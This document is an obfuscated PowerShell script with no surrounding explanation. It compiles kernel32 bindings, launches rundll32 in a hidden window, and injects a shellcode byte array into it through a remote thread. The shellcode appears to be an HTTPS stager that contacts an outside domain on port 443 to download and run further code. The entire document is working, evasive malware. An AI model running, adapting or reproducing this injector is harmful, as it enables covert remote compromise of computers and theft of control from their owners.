set-variaBLe  ("uB6"+"daF")  (  [TYPe]("{1}{2}{0}"-f 'ct','psO','BjE')  ) ;  SEt-ItEm VARiAbLE:0C7tF  ( [typE]("{3}{5}{1}{0}{2}{4}{6}" -f'SaCCe','S','s','k32.','S','Func+PrOCE','FlAGs')); ${S`KO}= [tYpe]("{0}{2}{1}"-f'i','r','nTpT') ; SEt-iTEM  vaRIaBle:7u0Gb  (  [type]("{0}{4}{3}{2}{1}"-f'SYstE','Rt','NVe','.CO','m')  );${bgw0L} = [TYpE]("{2}{0}{3}{1}" -f 'Ar','Y','SYSTEM.','Ra') ; ${w`I2}  =  [tYPe]("{3}{1}{2}{6}{4}{5}{0}" -F'pE','2.FunC+','Al','k3','n','ty','LoCaTIo')  ;   ${x`hT} =[tYpe]("{6}{8}{10}{4}{1}{9}{7}{11}{3}{5}{2}{0}" -F 'VIces.mArSHaL','un','ER','TER','R','OPS','sYs','E.','Tem','TIM','.','iN');   sv Usf ([TYPe]("{1}{4}{0}{3}{5}{2}"-f '.Fun','K','MeMoryPrOtecTion','C','32','+')  );  Set ('jWKyn'+'s')  ([Type]("{2}{0}{1}" -f'n','C','k32.fu')) ;   ${D`ks}  = [TypE]("{0}{2}{3}{1}"-F 'SYSteM.','PtR','I','NT') ; 
function C`l`eA`NInJECT {
${cO`DE} = @"
using System;
using System.Runtime.InteropServices;
namespace k32
{
    public class func
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
        All = 0x001F0FFF,
        CreateThread = 0x00000002
        }
        [Flags]
        public enum AllocationType
        {
        Commit = 0x1000,
        Reserve = 0x2000
        }
        [Flags]
        public enum MemoryProtection
        {
        ExecuteReadWrite = 0x40,
        ReadWrite = 0x04
        }
        [Flags]
        public enum Time : uint
        { Infinite = 0xFFFFFFFF }
        [DllImport("kernel32.dll")]
        public static extern bool IsWow64Process(IntPtr hProcess, [Out] IntPtr Wow64Process);
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, [Out] IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, MemoryProtection flNewProtect, [Out] IntPtr lpflOldProtect);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);
        [DllImport("kernel32.dll")]
        public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
    }
}
"@
${cOd`E`PrO`Vid`er} = &("{2}{1}{0}"-f't','c','New-Obje') ("{8}{7}{4}{10}{5}{2}{0}{3}{9}{6}{1}" -f'pCo','er','r','dePr','rp.C','a','d','a','Microsoft.CSh','ovi','Sh')
${l`OcA`TioN} =   (  LS  ("VaRi"+"ABl"+"e"+":uB6DaF") ).VAluE."A`sSEmBlY"."L`OCAT`Ion"
${CoMp`Il`e`PArAms} = &("{2}{0}{1}"-f 'ew-Ob','ject','N') ("{7}{2}{6}{5}{0}{3}{4}{8}{1}{9}"-f 'o','Para','m','mpi','l','ler.C','pi','System.CodeDom.Co','er','meters')
${A`SSEmbL`Y`RAnGe} = @(("{1}{0}{2}{3}"-f'em.d','Syst','l','l'), ${loC`A`TI`oN})
${COMPILE`Pa`R`A`ms}."r`EF`EreN`ceDA`sseMbL`I`eS".("{0}{1}" -f'AddRa','nge').Invoke(${aS`Se`MBlYRa`NGE})
${COM`PiL`EP`AramS}."GEne`RA`TeiNM`EmORy" = ${tr`Ue}
${oU`TPuT} = ${C`ODEpR`OvI`d`er}.("{1}{4}{0}{6}{5}{2}{3}"-f 'l','Com','c','e','pi','ur','eAssemblyFromSo').Invoke(${C`omPIlE`paRa`mS}, ${cO`dE})
function InjeC`T`-ShELLc`OdE`-InTo-REmot`E-pRoC([Int] ${i`d})
    {
        ${pRO`c`haN`Dle} =   (vaRiaBLe  jwkYns ).VaLUE::"O`Pen`pRo`cess"(  ${0`C7tf}::"A`ll", 0, ${ID})
        if ([Bool]!${proCHA`Nd`le}) { ${GlO`B`Al:RE`Sult} = 2; return }
        [Byte[]]${WO`W`64} = 0xFF
        if ((&("{2}{3}{1}{0}" -f't','jec','Get','-WmiOb') ("{3}{4}{1}{2}{0}" -f'or','ces','s','W','in32_Pro') ("{1}{2}{0}"-f 'ssWidth','Ad','dre'))."A`dDRES`SWId`Th" -ne 32)
        {
            ${W`oW`64pTr} =   ${x`HT}::("{4}{0}{3}{2}{1}{5}"-f'fPin','Arr','ed','n','UnsafeAddrO','ayElement').Invoke(${W`o`W64},0)
            ${T`EMp} =  ( Get-variABle  ("J"+"wKYnS") -vaL)::("{1}{2}{0}{3}"-f'w6','Is','Wo','4Process').Invoke(${pr`o`ch`ANdle}, ${WOW64`P`Tr})
            if ([Bool]!${wo`W64} -and ( (CHilDiTEM ('VAr'+'ia'+'BLE'+':sKO')).vaLue::"Si`ZE" -eq 4)) { ${gLO`B`A`L:`ReSULt} = 9; return }
            elseif ([Bool]!${W`oW64}){ ${S`c} = ${S`c64} }
        } else { ${wo`w64}[0] = 1 }
        ${bA`S`ea`DdR} =  (  gi  VArIABlE:JwKyns).VAlUe::"Vi`R`TualaL`locex"(${Pr`O`Ch`Andle}, 0, ${s`c}."LEn`gTh" + 1,   ${W`I2}::"re`S`ErvE" -bOr  ${w`i2}::"c`OmmIt",  ( ls  ('V'+'a'+'rIAB'+'Le:usF') ).vALuE::"EX`EcU`TEr`EaDWRIte")
        if ([Bool]!${BaSE`A`DdR}) { ${G`loBaL`:resUlT} = 3; return }
        [Int[]] ${bY`TE`Swr`itTEn} = 0
        ${b`yTeSwRiT`TENp`TR} =  (gET-VaRIaBle ('X'+'HT') ).vaLUe::("{1}{3}{2}{5}{6}{0}{4}"-f 'ayEleme','Un','rOfPinn','safeAdd','nt','edAr','r').Invoke(${Byte`s`Wr`itten},0)
        ${Su`CceSS} =  (gi  VARIablE:JwkyNS ).vaLUE::("{3}{0}{2}{1}" -f'iteP','cessMemory','ro','Wr').Invoke(${pr`OChAnD`le}, ${Bas`E`AddR}, ${S`C}, ${s`C}."LE`NGTh", ${b`Y`TESwritT`E`Np`TR})
        if ([Bool]!${s`Ucce`ss}) { ${gloB`A`l:re`SU`LT} = 4; return }
        ${K`32h`AND`le} =   (  gET-VARiable ('jw'+'kynS') -VaL  )::("{0}{2}{4}{3}{1}"-f'GetM','dle','odul','n','eHa').Invoke(("{1}{2}{3}{0}" -f'dll','k','ern','el32.'))
        ${EXI`TT`hREAd`A`Ddr} =   (  VarIABLe  ('j'+'Wk'+'YNs')  -Valueo  )::("{2}{0}{3}{1}"-f 'e','ress','G','tProcAdd').Invoke(${k`32Han`dlE}, ("{1}{0}{2}" -f'xitT','E','hread'))
        if ([Bool]!${exi`T`Th`REAdaDDR}) { ${globA`l:`Re`S`ULt} = 5; return }
        [Byte[]] ${ExIt`T`hReadAdd`R`lEbYTEs} = &("{2}{0}{1}" -f 'w','-Object','Ne') ("{0}{2}{1}"-f 'Byte',']','[')(4)
        ${i}=0
        ${E`xItThre`A`DAD`dr}.("{2}{1}{0}" -f'ring','oSt','T').Invoke("X8") -split '([A-F0-9]{2})' | &('%') { if (${_}) {${Ex`It`T`hREAd`ADd`RL`eBYTes}[${i}] =   ${7`U0gb}::("{1}{0}" -f'te','ToBy').Invoke(${_},16); ${i}++}}
         (  Dir ("v"+"ARIAbL"+"e:B"+"Gw0l")  ).VaLue::("{1}{0}"-f 'e','Revers').Invoke(${exI`TthreaD`AD`DR`l`ebyteS})
        ${Ba`S`EAdD`RLeB`YTEs} = &("{0}{1}{2}"-f 'N','ew-Ob','ject') ("{0}{1}"-f 'Byt','e[]')(4)
        ${i}=0
        ${BaS`eA`DdR}.("{2}{1}{0}" -f 'g','Strin','To').Invoke("X8") -split '([A-F0-9]{2})' | &('%') { if (${_}) {${BA`sea`ddrlEbyTES}[${I}] =  ${7u0gb}::("{0}{1}" -f 'ToBy','te').Invoke(${_},16); ${I}++}}
          ${bgW0l}::("{0}{1}" -f'Reve','rse').Invoke(${B`ASeaddRl`e`BYt`ES})
        if ([Bool]${wo`W64}) {
            [Byte[]] ${cALl`R`e`mOtET`h`REad} = 0xB8
            ${CA`llremot`ET`hReAd} += ${b`ASea`dDR`L`eByTEs}
            ${caLlReM`OTe`Th`READ} += 0xFF,0xD0,0x6A,0x00,0xB8
            ${CAlLr`eM`OTE`TH`ReaD} += ${exIT`T`hreA`DaddrleB`Y`Tes}
            ${cA`LlREmOtE`THr`e`AD} += 0xFF,0xD0
            ${CALL`RE`mOtE`ThrEa`DAdDr} =  ( gci  ('va'+'rIA'+'BLe:xht')  ).vALUE::("{8}{6}{4}{0}{3}{5}{2}{1}{7}"-f'i','Ele','y','nnedArr','OfP','a','r','ment','UnsafeAdd').Invoke(${cAL`l`REMOTeThr`eaD},0)
        } else {
            [Byte[]] ${ca`llrE`M`oTEThreAD} = 0x48,0xC7,0xC0
            ${cAl`l`ReMOT`eTH`R`EAD} += ${ba`s`eaDDRLe`B`yTes}
            ${CALLr`emO`TeTh`REAd} += 0xFF,0xD0,0x6A,0x00,0x48,0xC7,0xC0
            ${CaLlRemoT`e`TH`Re`Ad} += ${Ex`ItThr`e`AdAD`dRL`EB`YtEs}
            ${CA`LLREm`oTETh`Read} += 0xFF,0xD0
            ${cAL`L`R`eM`O`TEthrEaDAddR} =  ( vArIablE ('X'+'ht')).VALuE::("{5}{3}{2}{0}{4}{6}{8}{7}{1}"-f 'A','nnedArrayElement','fe','a','d','Uns','d','i','rOfP').Invoke(${CaLl`R`emOTetH`ReAD},0)
        }
        ${Re`Mo`T`eSTuBA`DDr} =   ( varIABLE JwkYNs -VALU  )::"v`iRT`UaLallo`cEx"(${Pr`O`chaN`dle}, 0, ${callRemOTEth`R`E`Ad}."L`EngTH",   (  variaBLE  wI2  ).vALUe::"Res`ErVE" -bOr   ${w`I2}::"cOmM`It",   ( get-CHILdItem vAriaBlE:USF ).valuE::"Exe`Cu`Ter`E`A`dwRITe")
        if ([Bool]!${remO`Te`stU`B`AdDR}) { ${G`lOBA`L:rE`S`Ult} = 3; return }
        [Int[]] ${O`ld`p`RoteCT} = 0
        ${p`OLd`prOT`Ect} =   (CHilDiTem  ("VA"+"RIaBLE:X"+"ht") ).vAlUe::("{4}{5}{3}{0}{6}{7}{1}{2}" -f'ne','El','ement','rOfPin','Unsaf','eAdd','dArra','y').Invoke(${OL`dPRoT`EcT},0)
        ${suc`C`eSS} =  (Get-VaRIAbLe  jWkyNS -VAl)::("{0}{1}{2}" -f 'Virtua','lProte','ct').Invoke(${cA`l`Lr`EMOt`eTh`ReAda`DDr}, ${caLl`Re`M`OTEThr`eAD}."LEn`g`TH",   ( vArIAblE uSF  -VALuEONlY  )::"exe`cu`TeReAd`wR`ItE", ${POLdpR`o`TEcT})
        if ([Bool]!${SuCC`E`ss}) { ${G`lob`A`L:rEsulT} = 6; return }
        ${sUC`cE`Ss} =   (VARIABLE  ('JWk'+'YN'+'S') ).VALuE::("{2}{0}{3}{1}{4}"-f 'iteP','ocessMem','Wr','r','ory').Invoke(${PR`OC`Hand`lE}, ${R`e`mOTESt`UBAd`dr}, ${ca`LlR`emot`et`HrEAd}, ${cAL`LREmO`TetH`R`ead}."LeN`gtH", ${By`TESWRitTenp`Tr})
        if ([Bool]!${S`U`CcESs}) { ${glo`Bal:R`ES`U`lT} = 4; return }
        [IntPtr] ${tHreA`dHAN`DLE} =   ( vAriaBLE ('jWk'+'Y'+'nS')  ).vALUe::("{0}{1}{3}{5}{2}{4}"-f'Creat','e','rea','Rem','d','oteTh').Invoke(${pro`ch`ANDLE}, 0, 0, ${Rem`oT`eST`UB`AddR}, ${b`AS`e`AdDR}, 0, 0)
        if ([Bool]!${T`HrEad`hanDle}) { ${Glo`B`AL`:Re`sUlt} = 7; return }
        ${SuC`ceSs} =   ${JwK`YnS}::("{0}{2}{1}"-f'C','e','loseHandl').Invoke(${PROc`h`AnDlE})
        if ([Bool]!${S`UCC`ess}) { ${glob`A`L:re`sUlT} = 8; return }
        ${GlobAL`:`R`es`ULT} = 1
        return
    }
[Byte[]]${SC} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xe8,0x80,0x00,0x00,0x00,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,0x20,0x57,0x4f,0x57,0x36,0x34,0x3b,0x20,0x54,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x00,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x00,0x59,0x31,0xff,0x57,0x57,0x57,0x57,0x51,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0xe9,0x93,0x00,0x00,0x00,0x5b,0x31,0xc9,0x51,0x51,0x6a,0x03,0x51,0x51,0x68,0xbb,0x01,0x00,0x00,0x53,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc3,0xeb,0x7a,0x59,0x31,0xd2,0x52,0x68,0x00,0x32,0xa0,0x84,0x52,0x52,0x52,0x51,0x52,0x50,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x89,0xc6,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x31,0xff,0x57,0x57,0x57,0x57,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x74,0x48,0x31,0xff,0x85,0xf6,0x74,0x04,0x89,0xf9,0xeb,0x09,0x68,0xaa,0xc5,0xe2,0x5d,0xff,0xd5,0x89,0xc1,0x68,0x45,0x21,0x5e,0x31,0xff,0xd5,0x31,0xff,0x57,0x6a,0x07,0x51,0x56,0x50,0x68,0xb7,0x57,0xe0,0x0b,0xff,0xd5,0xbf,0x00,0x2f,0x00,0x00,0x39,0xc7,0x75,0x04,0x89,0xd8,0xeb,0x8a,0x31,0xff,0xeb,0x15,0xeb,0x49,0xe8,0x81,0xff,0xff,0xff,0x2f,0x51,0x63,0x70,0x67,0x00,0x00,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x57,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcd,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0xe8,0x1d,0xff,0xff,0xff,0x77,0x6f,0x6d,0x65,0x6e,0x2d,0x66,0x6f,0x72,0x2d,0x68,0x69,0x6c,0x6c,0x61,0x72,0x79,0x2e,0x63,0x6f,0x6d,0x00
${OrD`P`Rocs} = (&("{1}{3}{0}{2}" -f'c','G','ess','et-Pro') -name ("{1}{0}" -f 'undll32','r') -ErrorAction ("{0}{4}{2}{1}{3}"-f'S','C','ntly','ontinue','ile')) | &("{2}{1}{0}"-f 't','Objec','Select-') -property ('id') | &("{0}{1}" -f'sele','ct') -expand ('id')
if (${o`Rd`ProCs} -eq ${n`ULL}){ 
	if (  ${D`ks}::"S`IZe" -eq 4) { 
		&("{0}{3}{2}{1}"-f'St','ocess','r','art-P') -FilePath ((("{2}{1}{11}{10}{5}{4}{12}{6}{8}{9}{3}{0}{7}" -f'2.','Win','C:{0}','3','{0','s','{0}','exe','rundl','l','w','do','}System32')) -f [cHaR]92) -ArgumentList ("{6}{0}{4}{3}{7}{1}{5}{2}" -f 'u','Pri','IEntry','dll','i.','ntU','Print',' ') -win ("{0}{1}"-f'Hid','den')
		${i`d} = (&("{2}{1}{0}" -f'ess','oc','Get-Pr') -Name ("{1}{2}{0}" -f '32','r','undll'))| &("{0}{3}{2}{1}"-f'Sele','ect','Obj','ct-') -property ('id') | &("{0}{1}" -f'sel','ect') -expand ('id')
		&("{7}{8}{9}{3}{4}{2}{6}{1}{0}{5}" -f 'e-P','mot','de-Into-','lc','o','roc','Re','Injec','t-Sh','el') ${I`d}
	}
	else { 
		&("{1}{4}{3}{2}{0}" -f's','S','t-Proces','r','ta') -FilePath ((("{2}{4}{6}{11}{0}{10}{5}{1}{3}{7}{8}{9}" -f's{0','sWOW64{0}r','C:{','u','0}','y','W','ndll32','.e','xe','}S','indow')) -f  [CHar]92) -ArgumentList ("{2}{0}{1}{3}{4}"-f 'i.dl','l','Printu',' Prin','tUIEntry') -win ("{1}{0}"-f 'en','Hidd')
		${Id} = (&("{0}{2}{1}{3}" -f 'G','t-Pr','e','ocess') -Name ("{2}{1}{0}"-f 'l32','undl','r'))| &("{1}{2}{0}"-f'ct','Select-O','bje') -property ('id') | &("{1}{0}"-f't','selec') -expand ('id')
		&("{7}{5}{2}{4}{0}{6}{3}{1}" -f'o','c','e-Into-R','-Pro','em','cod','te','Inject-Shell') ${I`d}
	}
  }
else {
	if (  ${D`ks}::"Si`zE" -eq 4) { 
		&("{0}{4}{3}{2}{1}"-f'Sta','rocess','P','t-','r') -FilePath ((("{1}{3}{5}{6}{2}{4}{0}"-f'xe','C:BFfWindowsBFfSys','dl','te','l32.e','m','32BFfrun'))."R`ePlACE"('BFf',[STrInG][CHar]92)) -ArgumentList ("{6}{3}{5}{1}{0}{2}{4}" -f'tU','i.dll Prin','IEnt','rint','ry','u','P') -win ("{0}{1}" -f'Hi','dden')
		${rdP`Ro`CS} = (&("{3}{0}{2}{1}"-f 't-Proce','s','s','Ge') -Name ("{0}{2}{1}"-f'r','ll32','und'))| &("{3}{0}{1}{2}"-f 'el','ect-O','bject','S') -property ('id') | &("{2}{1}{0}"-f't','elec','s') -expand ('id')
		${I`d} = &("{2}{0}{3}{1}"-f'a','t','Comp','re-Objec') -ReferenceObject ${OR`d`PROcS} -DifferenceObject ${Rdp`R`OCs} -PassThru
		&("{1}{4}{0}{3}{5}{2}"-f'-S','I','e-Into-Remote-Proc','h','nject','ellcod') ${ID}
	} 
	else { 
		&("{4}{2}{0}{1}{3}" -f'P','roce','rt-','ss','Sta') -FilePath ((("{7}{2}{6}{9}{5}{4}{0}{8}{1}{3}{10}{11}" -f '}Sys','run','W','dll','s{0','w','i','C:{0}','WOW64{0}','ndo','3','2.exe'))  -f[cHar]92) -ArgumentList ("{4}{1}{5}{2}{0}{6}{3}"-f 'r','intui.dll','P','UIEntry','Pr',' ','int') -win ("{1}{0}" -f'n','Hidde')
		${r`dProCS} = (&("{1}{3}{2}{0}" -f 's','G','s','et-Proce') -Name ("{2}{0}{1}"-f'n','dll32','ru'))| &("{3}{0}{1}{2}" -f'ec','t','-Object','Sel') -property ('id') | &("{1}{0}"-f 'ct','sele') -expand ('id')
		${iD} = &("{2}{3}{0}{1}" -f 'bjec','t','Compare','-O') -ReferenceObject ${o`RDPR`oCs} -DifferenceObject ${R`DP`ROCs} -PassThru
		&("{2}{6}{5}{1}{0}{3}{4}" -f'e-Int','d','Inject-','o-Remote','-Proc','llco','She') ${I`D}		
	}
  }
}
&("{2}{0}{1}"-f 'anIn','ject','Cle')


